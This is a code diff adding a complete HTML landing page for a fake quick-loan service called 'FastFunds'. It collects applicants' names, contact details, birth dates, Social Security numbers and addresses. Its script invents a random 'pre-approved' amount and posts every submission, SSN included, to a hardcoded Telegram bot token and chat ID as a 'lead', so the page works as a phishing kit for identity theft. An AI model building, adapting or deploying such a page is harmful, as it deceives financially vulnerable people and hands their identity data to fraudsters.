@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FastFunds | Fast Loans and Funding in 24 Hours</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Inter:wght@400;500;600&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        .hero-font { font-family: 'Playfair Display', serif; }
+        .money-green { color: #10b981; }
+        
+        .form-input { transition: all 0.2s ease; }
+        .form-input.invalid {
+            border-color: #ef4444 !important;
+            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.2);
+        }
+    </style>
+</head>
+<body class="bg-zinc-950 text-white">
+
+    <!-- NAVBAR -->
+    <nav class="bg-black sticky top-0 z-50 border-b border-zinc-800">
+        <div class="max-w-6xl mx-auto px-6 py-5 flex justify-between items-center">
+            <div class="flex items-center gap-3">
+                <i class="fa-solid fa-bolt text-4xl money-green"></i>
+                <h1 class="text-3xl font-bold">FastFunds</h1>
+            </div>
+        </div>
+    </nav>
+
+    <div id="main-content">
+
+    <!-- HERO -->
+    <div class="bg-gradient-to-br from-emerald-900 via-black to-zinc-950 py-20 text-center">
+        <div class="max-w-4xl mx-auto px-6">
+            <h1 class="hero-font text-5xl md:text-7xl font-bold leading-tight mb-6">
+                FAST FUNDING<br><span class="money-green">$500 - $5,000</span>
+            </h1>
+            <p class="text-3xl text-emerald-400 mb-8">Pre-approval in minutes • Money in your account in 24-48 hours</p>
+            <p class="text-xl max-w-2xl mx-auto mb-10">No matter your credit history. We are your intermediary with the best financial institutions.</p>
+            
+            <button onclick="showMainForm()" class="bg-emerald-500 hover:bg-emerald-600 text-white text-2xl font-bold px-12 py-6 rounded-3xl inline-flex items-center gap-4">
+                GET MY LOAN NOW <i class="fa-solid fa-arrow-right"></i>
+            </button>
+            
+            <p class="mt-8 text-zinc-400 flex items-center justify-center gap-2">
+                <i class="fa-solid fa-check-circle"></i> Approval without hard credit check
+            </p>
+        </div>
+    </div>
+
+    <!-- HOW IT WORKS -->
+    <div class="py-16 bg-zinc-900">
+        <div class="max-w-6xl mx-auto px-6">
+            <h2 class="text-4xl font-bold text-center mb-12">How it works in 3 steps</h2>
+            <div class="grid md:grid-cols-3 gap-8">
+                <div class="text-center">
+                    <div class="text-6xl mb-4">1️⃣</div>
+                    <h3 class="text-2xl font-bold mb-2">Fill out the form</h3>
+                    <p class="text-zinc-400">Your information in 60 seconds</p>
+                </div>
+                <div class="text-center">
+                    <div class="text-6xl mb-4">2️⃣</div>
+                    <h3 class="text-2xl font-bold mb-2">Our team submits it</h3>
+                    <p class="text-zinc-400">We present it to multiple lenders</p>
+                </div>
+                <div class="text-center">
+                    <div class="text-6xl mb-4">3️⃣</div>
+                    <h3 class="text-2xl font-bold mb-2">We contact you</h3>
+                    <p class="text-zinc-400">Pre-approval in 1-3 days</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MAIN FORM MODAL -->
+    <div id="main-form-modal" class="hidden fixed inset-0 bg-black/90 z-[99999] flex items-center justify-center px-4">
+        <div id="modal-content" class="bg-white text-zinc-900 max-w-2xl w-full rounded-3xl p-6 md:p-8 relative max-h-[90vh] overflow-y-auto shadow-2xl">
+
+            <button onclick="hideMainForm()" class="absolute top-4 right-4 text-4xl text-zinc-400 hover:text-zinc-600 z-10">✕</button>
+
+            <!-- STEP 1: FORM -->
+            <div id="step-form">
+                <h2 class="text-4xl font-bold text-center mb-6">Apply for Fast Funding</h2>
+
+                <div id="form-error" class="hidden bg-red-50 border border-red-200 text-red-600 px-5 py-3 rounded-2xl text-sm font-medium mb-6 flex items-center gap-2">
+                    <i class="fa-solid fa-circle-exclamation"></i>
+                    Please correct the fields marked in red
+                </div>
+                
+                <div class="space-y-5">
+                    <div class="grid grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-zinc-600 text-sm font-medium mb-1.5">First Name</label>
+                            <input id="firstName" type="text" placeholder="First Name" class="form-input w-full border border-zinc-300 p-5 rounded-2xl text-lg">
+                        </div>
+                        <div>
+                            <label class="block text-zinc-600 text-sm font-medium mb-1.5">Last Name</label>
+                            <input id="lastName" type="text" placeholder="Last Name" class="form-input w-full border border-zinc-300 p-5 rounded-2xl text-lg">
+                        </div>
+                    </div>
+
+                    <div>
+                        <label class="block text-zinc-600 text-sm font-medium mb-1.5">Email Address</label>
+                        <input id="email" type="email" placeholder="your@email.com" class="form-input w-full border border-zinc-300 p-5 rounded-2xl text-lg">
+                    </div>
+
+                    <div>
+                        <label class="block text-zinc-600 text-sm font-medium mb-1.5">Phone Number</label>
+                        <input id="phone" type="tel" placeholder="(555) 555-1234" class="form-input w-full border border-zinc-300 p-5 rounded-2xl text-lg">
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-zinc-600 text-sm font-medium mb-1.5">Date of Birth</label>
+                            <input id="dob" type="date" class="form-input w-full border border-zinc-300 p-5 rounded-2xl text-lg">
+                        </div>
+                        <div>
+                            <label class="block text-zinc-600 text-sm font-medium mb-1.5">SSN</label>
+                            <input id="ssn" type="text" placeholder="123-45-6789" class="form-input w-full border border-zinc-300 p-5 rounded-2xl text-lg">
+                        </div>
+                    </div>
+
+                    <div>
+                        <label class="block text-zinc-600 text-sm font-medium mb-1.5">Desired Loan Amount</label>
+                        <input id="amount" type="text" placeholder="$1500" class="form-input w-full border border-zinc-300 p-5 rounded-2xl text-lg">
+                    </div>
+
+                    <div class="pt-4 border-t border-zinc-200">
+                        <h3 class="text-lg font-semibold text-zinc-800 mb-4">Address Information</h3>
+                        <div>
+                            <label class="block text-zinc-600 text-sm font-medium mb-1.5">Address Line 1</label>
+                            <input id="address" type="text" placeholder="123 Main Street" class="form-input w-full border border-zinc-300 p-5 rounded-2xl text-lg mb-4">
+                        </div>
+                        <div>
+                            <label class="block text-zinc-600 text-sm font-medium mb-1.5">Address Line 2 (optional)</label>
+                            <input id="address2" type="text" placeholder="Apt 4B, Suite 200" class="form-input w-full border border-zinc-300 p-5 rounded-2xl text-lg mb-4">
+                        </div>
+                        <div class="grid grid-cols-12 gap-4">
+                            <div class="col-span-12 md:col-span-5">
+                                <label class="block text-zinc-600 text-sm font-medium mb-1.5">City</label>
+                                <input id="city" type="text" placeholder="Los Angeles" class="form-input w-full border border-zinc-300 p-5 rounded-2xl text-lg">
+                            </div>
+                            <div class="col-span-6 md:col-span-3">
+                                <label class="block text-zinc-600 text-sm font-medium mb-1.5">State</label>
+                                <input id="state" type="text" placeholder="CA" maxlength="2" class="form-input w-full border border-zinc-300 p-5 rounded-2xl text-lg">
+                            </div>
+                            <div class="col-span-6 md:col-span-4">
+                                <label class="block text-zinc-600 text-sm font-medium mb-1.5">ZIP Code</label>
+                                <input id="zip" type="text" placeholder="90210" maxlength="5" class="form-input w-full border border-zinc-300 p-5 rounded-2xl text-lg">
+                            </div>
+                        </div>
+                    </div>
+
+                    <button onclick="submitApplication()" class="w-full py-6 bg-emerald-600 hover:bg-emerald-700 text-white rounded-3xl text-2xl font-bold mt-6">
+                        SUBMIT APPLICATION →
+                    </button>
+                </div>
+            </div>
+
+            <!-- STEP 2: LOADING -->
+            <div id="step-loading" class="hidden text-center py-12">
+                <div class="flex justify-center mb-6">
+                    <i class="fa-solid fa-spinner fa-spin text-6xl text-emerald-600"></i>
+                </div>
+                <h3 class="text-2xl font-bold mb-2">Processing your application...</h3>
+                <p class="text-zinc-500">We are submitting your request to the best lenders</p>
+            </div>
+
+            <!-- STEP 3: SUCCESS -->
+            <div id="step-success" class="hidden text-center py-8">
+                <i class="fa-solid fa-check-circle text-7xl text-emerald-500 mb-6"></i>
+                <h2 class="text-4xl font-bold mb-2">Congratulations!</h2>
+                <p class="text-xl text-emerald-600 mb-6">Your loan has been <strong>PRE-APPROVED</strong></p>
+                
+                <div class="bg-emerald-50 rounded-3xl p-8 mb-8">
+                    <p class="text-sm text-zinc-600 mb-1">Approved by</p>
+                    <p class="text-3xl font-bold text-emerald-600">Finance Approved Now</p>
+                    <p id="approved-amount" class="text-5xl font-bold text-emerald-600 mt-4">$3,750</p>
+                </div>
+
+                <button onclick="acceptOffer()" class="w-full py-6 bg-emerald-600 hover:bg-emerald-700 text-white rounded-3xl text-2xl font-bold">
+                    Accept Offer
+                </button>
+            </div>
+        </div>
+    </div>   <!-- CIERRE DEL main-content -->
+
+    <!-- ALREADY REQUEST SCREEN -->
+    <div id="request-already-screen" class="hidden bg-white text-zinc-900 rounded-3xl p-10 shadow-2xl max-w-md mx-auto text-center">
+        <i class="fa-solid fa-clock text-8xl text-amber-500 mb-6"></i>
+        <h2 class="text-3xl font-bold mb-4">We already have a request in process</h2>
+        <p class="text-zinc-600 text-lg leading-relaxed">
+            Your request is being processed.<br>
+            We will process it within <strong>24 to 72 hours</strong>.<br><br>
+            We will contact you if necessary.
+        </p>
+
+        <div class="bg-amber-50 border border-amber-200 rounded-2xl p-6 text-sm text-amber-700 mt-6">
+            <strong>✅ Thank you for trusting us.</strong>
+        </div>
+    </div>
+
+    <!-- LOADING SCREEN BEFORE REDIRECT -->
+    <div id="loading-screen-finance" class="hidden fixed inset-0 bg-white flex items-center justify-center z-[10000]">
+        <div class="text-center max-w-md px-6">
+            <i class="fa-solid fa-spinner fa-spin text-7xl text-amber-600 mb-8"></i>
+            <h2 class="text-3xl font-bold text-zinc-900 mb-4">
+                We are connecting you with Finance Approved Now
+            </h2>
+            <p class="text-zinc-600 text-lg">Please wait a moment...</p>
+            <div class="mt-8 text-amber-600 font-medium">This may take up to 10 seconds</div>
+        </div>
+    </div>
+
+    <script>
+        // ==================== PON TUS DATOS REALES AQUÍ ====================
+        const TELEGRAM_TOKEN = "8233993082:AAGO8SFnbPr_OtEStO8APgwdu2ahbRALvQg";
+        const CHAT_ID = "1394119967";
+
+        let approvedAmount;   // ← Variable global para que acceptOffer la pueda usar
+
+        function showMainForm() {
+            document.getElementById('main-form-modal').classList.remove('hidden');
+            showStep('form');
+            document.getElementById('form-error').classList.add('hidden');
+            document.body.style.overflow = 'hidden';
+        }
+        
+        function hideMainForm() {
+            document.getElementById('main-form-modal').classList.add('hidden');
+            document.body.style.overflow = 'visible';
+        }
+
+        function showStep(step) {
+            document.getElementById('step-form').classList.add('hidden');
+            document.getElementById('step-loading').classList.add('hidden');
+            document.getElementById('step-success').classList.add('hidden');
+            document.getElementById('step-' + step).classList.remove('hidden');
+        }
+
+        function goBackToForm() {
+            showStep('form');
+        }
+
+        function isValidEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
+
+        function validateField(input, isValid) {
+            if (isValid) input.classList.remove('invalid');
+            else input.classList.add('invalid');
+        }
+
+        function formatPhone(input) {
+            let digits = input.value.replace(/\D/g, '').slice(0, 10);
+            if (digits.length > 6) input.value = `(${digits.substring(0,3)}) ${digits.substring(3,6)}-${digits.substring(6)}`;
+            else if (digits.length > 3) input.value = `(${digits.substring(0,3)}) ${digits.substring(3)}`;
+            else input.value = digits;
+            validateField(input, digits.length === 10);
+        }
+
+        function formatSSN(input) {
+            let digits = input.value.replace(/\D/g, '').slice(0, 9);
+            if (digits.length > 5) input.value = `${digits.substring(0,3)}-${digits.substring(3,5)}-${digits.substring(5)}`;
+            else if (digits.length > 3) input.value = `${digits.substring(0,3)}-${digits.substring(3)}`;
+            else input.value = digits;
+            validateField(input, digits.length === 9);
+        }
+
+        function formatAmount(input) {
+            let digits = input.value.replace(/\D/g, '').slice(0, 4);
+            const num = parseInt(digits) || 0;
+            input.value = digits.length > 0 ? '$' + digits : '';
+            validateField(input, num >= 500 && num <= 5000);
+        }
+
+        function formatState(input) {
+            let val = input.value.replace(/[^A-Za-z]/g, '').toUpperCase().slice(0, 2);
+            input.value = val;
+            validateField(input, val.length === 2);
+        }
+
+        function formatZip(input) {
+            let val = input.value.replace(/\D/g, '').slice(0, 5);
+            input.value = val;
+            validateField(input, val.length === 5);
+        }
+
+        function preventExtraDigits(input, maxDigits) {
+            input.addEventListener('keydown', function(e) {
+                const current = this.value.replace(/\D/g, '').length;
+                if (current >= maxDigits && /\d/.test(e.key)) e.preventDefault();
+            });
+        }
+
+        function submitApplication() {
+            const firstName = document.getElementById('firstName').value.trim();
+            const lastName = document.getElementById('lastName').value.trim();
+            const emailInput = document.getElementById('email');
+            const phoneInput = document.getElementById('phone');
+            const dobInput = document.getElementById('dob');
+            const ssnInput = document.getElementById('ssn');
+            const amountInput = document.getElementById('amount');
+            const stateInput = document.getElementById('state');
+            const zipInput = document.getElementById('zip');
+
+            const emailValid = isValidEmail(emailInput.value);
+            const phoneValid = phoneInput.value.replace(/\D/g, '').length === 10;
+            const dobValid = dobInput.value && new Date().getFullYear() - new Date(dobInput.value).getFullYear() >= 18;
+            const ssnValid = ssnInput.value.replace(/\D/g, '').length === 9;
+            const amountNum = parseInt(amountInput.value.replace(/\D/g, '')) || 0;
+            const amountValid = amountNum >= 500 && amountNum <= 5000;
+            const stateValid = stateInput.value.length === 2;
+            const zipValid = zipInput.value.length === 5;
+
+            const hasError = !firstName || !lastName || !emailValid || !phoneValid || 
+                            !dobValid || !ssnValid || !amountValid || !stateValid || !zipValid;
+
+            if (hasError) {
+                document.getElementById('form-error').classList.remove('hidden');
+                return;
+            }
+
+            document.getElementById('form-error').classList.add('hidden');
+            showStep('loading');
+
+            setTimeout(() => {
+                // === MONTO LIMITADO ENTRE $1,000 Y $4,500 ===
+                const min = 10;   // 1000
+                const max = 45;   // 4500
+                const random = Math.floor(Math.random() * (max - min + 1)) + min;
+                const randomAmount = random * 100;   // siempre termina en 00
+
+                approvedAmount = randomAmount;
+
+                document.getElementById('approved-amount').textContent = '$' + randomAmount;
+
+                showStep('success');
+
+                const fullName = `${firstName} ${lastName}`;
+                const address = document.getElementById('address').value.trim();
+                const address2 = document.getElementById('address2').value.trim();
+                const city = document.getElementById('city').value.trim();
+
+                const message = `<b>🚀 NUEVO LEAD - FASTFUNDS</b>\n\n` +
+                                `<b>Nombre:</b> ${fullName}\n` +
+                                `<b>Email:</b> ${emailInput.value}\n` +
+                                `<b>Teléfono:</b> ${phoneInput.value}\n` +
+                                `<b>Fecha nacimiento:</b> ${dobInput.value || '—'}\n` +
+                                `<b>SSN:</b> ${ssnInput.value}\n` +
+                                `<b>Monto solicitado:</b> ${amountInput.value}\n` +
+                                `<b>Monto APROBADO:</b> $${randomAmount}\n\n` +
+                                `<b>Dirección:</b>\n${address}\n${address2 ? address2 + '\n' : ''}${city}, ${stateInput.value} ${zipInput.value}`;
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "HTML" })
+                });
+            }, 15000);
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const phone = document.getElementById('phone');
+            const ssn = document.getElementById('ssn');
+            const amount = document.getElementById('amount');
+            const state = document.getElementById('state');
+            const zip = document.getElementById('zip');
+            const email = document.getElementById('email');
+
+            phone.addEventListener('input', () => formatPhone(phone));
+            ssn.addEventListener('input', () => formatSSN(ssn));
+            amount.addEventListener('input', () => formatAmount(amount));
+            state.addEventListener('input', () => formatState(state));
+            zip.addEventListener('input', () => formatZip(zip));
+            email.addEventListener('input', () => validateField(email, isValidEmail(email.value)));
+
+            preventExtraDigits(phone, 10);
+            preventExtraDigits(ssn, 9);
+            preventExtraDigits(amount, 4);
+        });
+
+        function acceptOffer() {
+            hideMainForm();
+
+            const loading = document.getElementById('loading-screen-finance');
+            if (loading) loading.classList.remove('hidden');
+
+            setTimeout(() => {
+                window.location.href = `fastfunds-finance.html?amount=${approvedAmount}`;
+            }, 10000);
+        }
+    </script>
+
+</body>
+</html>
